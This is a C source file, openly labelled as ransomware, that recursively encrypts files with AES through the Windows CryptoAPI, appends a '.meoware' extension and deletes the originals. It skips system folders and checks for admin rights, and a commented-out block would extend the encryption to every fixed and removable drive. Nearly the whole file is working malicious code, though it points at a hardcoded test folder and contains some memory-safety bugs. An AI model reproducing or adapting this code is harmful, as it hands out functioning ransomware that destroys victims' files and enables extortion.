/*
 * hack.c
 * Ransomware AES encryption
 * author @cocomelonc
*/

#include <windows.h>
#include <wincrypt.h>
#include <stdio.h>
#include <process.h>
#include <stdbool.h>

#define AES_BLOCK_SIZE 16
#define IN_CHUNK_SIZE (AES_BLOCK_SIZE * 10)
#define OUT_CHUNK_SIZE (IN_CHUNK_SIZE * 2)
#define MAX_THREADS 8  // Adjust as needed
#define MAX_FOLDERS 26
#define MAX_PATH_LENGTH 260

// we do not encrypt sensitive folders and files
const char* blacklistDirectories[] = {
  "C:\\Windows\\",
  "C:\\Program Files (x86)\\",
  "C:\\Program Files\\",
  "C:\\ProgramData\\",
  "Z:\\",
};

// Structure to hold data for each thread
struct ThreadData {
  const char* inputFile;
  const char* outputFile;
  const BYTE* aesKey;
};

void encryptFile(const char* inputFile, const char* outputFile, const char* aesKey) {
  HCRYPTPROV hCryptProv = NULL;
  HCRYPTKEY hKey = NULL;
  HANDLE hInputFile = INVALID_HANDLE_VALUE;
  HANDLE hOutputFile = INVALID_HANDLE_VALUE;

  // Open input file for reading
  hInputFile = CreateFileA(inputFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
  if (hInputFile == INVALID_HANDLE_VALUE) {
    return;
  }

  // Check file size
  LARGE_INTEGER fileSize;
  if (!GetFileSizeEx(hInputFile, &fileSize)) {
    CloseHandle(hInputFile);
    return;
  }

  // Encrypt only if file size is less than 128MB
  if (fileSize.QuadPart > 128 * 1024 * 1024) {
    CloseHandle(hInputFile);
    return;
  }

  // Create output file for writing
  hOutputFile = CreateFileA(outputFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
  if (hOutputFile == INVALID_HANDLE_VALUE) {
    CloseHandle(hInputFile);
    return;
  }

  // Cryptographic service provider
  if (!CryptAcquireContextA(&hCryptProv, NULL, "Microsoft Enhanced RSA and AES Cryptographic Provider", PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
    // goto Cleanup;
    CryptDestroyKey(hKey);
    CryptReleaseContext(hCryptProv, 0);
  }

  HCRYPTHASH hHash;
  if (!CryptCreateHash(hCryptProv, CALG_SHA_256, 0, 0, &hHash)) {
    // goto Cleanup;
    CryptDestroyKey(hKey);
    CryptReleaseContext(hCryptProv, 0);
  }

  if (!CryptHashData(hHash, (BYTE*)aesKey, strlen(aesKey), 0)) {
    // goto Cleanup;
    CryptDestroyKey(hKey);
    CryptReleaseContext(hCryptProv, 0);
  }

  if (!CryptDeriveKey(hCryptProv, CALG_AES_128, hHash, 0, &hKey)) {
    // goto Cleanup;
    CryptDestroyKey(hKey);
    CryptReleaseContext(hCryptProv, 0);
  }

  const size_t chunk_size = OUT_CHUNK_SIZE;
  BYTE* chunk = (BYTE*)malloc(chunk_size);
  DWORD out_len = 0;

  BOOL isFinal = FALSE;
  DWORD readTotalSize = 0;
  BOOL bResult = FALSE;

  while (bResult = ReadFile(hInputFile, chunk, IN_CHUNK_SIZE, &out_len, NULL)) {
    if (0 == out_len) {
      break;
    }
    readTotalSize += out_len;
    if (readTotalSize >= fileSize.QuadPart) {
      isFinal = TRUE;
    }

    if (!CryptEncrypt(hKey, NULL, isFinal, 0, chunk, &out_len, chunk_size)) {
      break;
    }

    DWORD written = 0;
    if (!WriteFile(hOutputFile, chunk, out_len, &written, NULL)) {
      break;
    }

    memset(chunk, 0, chunk_size);
  }

  if (hInputFile != INVALID_HANDLE_VALUE) {
    CloseHandle(hInputFile);
  }
  if (hOutputFile != INVALID_HANDLE_VALUE) {
    CloseHandle(hOutputFile);
  }

  // Delete the original file after encryption
  if (!DeleteFileA(inputFile)) {
    printf("error deleting file %s: %d\n", inputFile, GetLastError());
  } else {
    printf("successfully deleted the original file: %s\n", inputFile);
  }

  if (hKey != NULL) {
    CryptDestroyKey(hKey);
  }
  if (hCryptProv != NULL) {
    CryptReleaseContext(hCryptProv, 0);
  }

  free(chunk);
}


// encryption function to be called by each thread
unsigned __stdcall encryptFileThread(void* args) {
  struct ThreadData* threadData = (struct ThreadData*)args;
  encryptFile(threadData->inputFile, threadData->outputFile, threadData->aesKey);
  return 0;
}

void encryptFiles(const char* folderPath, const BYTE* key) {
  WIN32_FIND_DATAA findFileData;
  char searchPath[MAX_PATH];
  sprintf_s(searchPath, MAX_PATH, "%s\\*", folderPath);

  HANDLE hFind = FindFirstFileA(searchPath, &findFileData);

  if (hFind == INVALID_HANDLE_VALUE) {
    printf("Error: %d\n", GetLastError());
    return;
  }

  HANDLE threadHandles[MAX_THREADS];
  int threadCount = 0;

  do {
    const char* fileName = findFileData.cFileName;

    if (strcmp(fileName, ".") == 0 || strcmp(fileName, "..") == 0) {
      continue;
    }

    char filePath[MAX_PATH];
    sprintf_s(filePath, MAX_PATH, "%s\\%s", folderPath, fileName);

    int isBlacklisted = 0;
    for (int i = 0; i < MAX_PATH_LENGTH; ++i) {
      if (blacklistDirectories[i] != NULL && strstr(filePath, blacklistDirectories[i]) != NULL) {
        isBlacklisted = 1;
        break;
      }
    }
  
    if (!isBlacklisted) {
      if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
        // recursive call for subfolders
        encryptFiles(filePath, key);
      } else {
        // Process individual files
        printf("File: %s\n", filePath);
        char encryptedFilePath[MAX_PATH];
        sprintf_s(encryptedFilePath, MAX_PATH, "%s.meoware", filePath);
        struct ThreadData threadData = { filePath, encryptedFilePath, key };

        // Start a new thread
        threadHandles[threadCount] = (HANDLE)_beginthreadex(NULL, 0, &encryptFileThread, (void*)&threadData, 0, NULL);
        if (threadHandles[threadCount] == 0) {
          printf("error creating thread\n");
          return;
        }

        threadCount++;

        // Wait for threads to finish before processing the next file
        if (threadCount == MAX_THREADS) {
          WaitForMultipleObjects(threadCount, threadHandles, TRUE, INFINITE);

          // Close thread handles
          for (int i = 0; i < threadCount; i++) {
            CloseHandle(threadHandles[i]);
          }

          threadCount = 0;
        }
        printf("File: %s OK!\n", filePath);
      }
    }
  } while (FindNextFileA(hFind, &findFileData) != 0);

  // Wait for remaining threads to finish
  WaitForMultipleObjects(threadCount, threadHandles, TRUE, INFINITE);

  // Close thread handles
  for (int i = 0; i < threadCount; i++) {
    CloseHandle(threadHandles[i]);
  }

  FindClose(hFind);
}

void enumerateDrives(char folders[][MAX_PATH_LENGTH], int* folderCount) {
  DWORD drives = GetLogicalDrives();
  char drive[] = "A:\\";
  int driveType;

  for (int i = 0; i < 26; ++i) {
    if (drives & 1) {
      drive[0] = 'A' + i;
      driveType = GetDriveTypeA(drive);

      if (driveType == DRIVE_FIXED || driveType == DRIVE_REMOVABLE) {
        int isBlacklisted = 0;
        for (int j = 0; j < MAX_PATH_LENGTH; ++j) {
          if (blacklistDirectories[j] != NULL && strstr(drive, blacklistDirectories[j]) != NULL) {
            isBlacklisted = 1;
            break;
          }
        }

        if (!isBlacklisted) {
          strcpy_s(folders[*folderCount], drive);
          (*folderCount)++;
        }
      }
    }
    drives >>= 1;
  }
}


// check for admin rights
bool isUserAdmin() {
  bool isElevated = false;
  HANDLE token;
  TOKEN_ELEVATION elev;
  DWORD size;
  if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
    if (GetTokenInformation(token, TokenElevation, &elev, sizeof(elev), &size)) {
       isElevated = elev.TokenIsElevated;
    }
  }
  if (token) {
    CloseHandle(token);
    token = NULL;
  }
  return isElevated;
}


int main() {
  if (!isUserAdmin()) {
    printf("please, run as admin.\n");
    return -1;
  }

  const char* rootFolder = "C:\\Users\\user1\\Desktop\\books";
  const char* privateKey = "mymy16ByteKey12";
  encryptFiles(rootFolder, privateKey);
  // char folders[MAX_FOLDERS][MAX_PATH];
  // int folderCount = 0;  

  // enumerateDrives(folders, &folderCount);
  // // encrypt the enumerated folders
  // printf("Enumerated Folders:\n");
  // for (int i = 0; i < folderCount; ++i) {
  //   printf("%s\n", folders[i]);
  //   encryptFiles(folders[i], privateKey);
  // }
  return 0;
}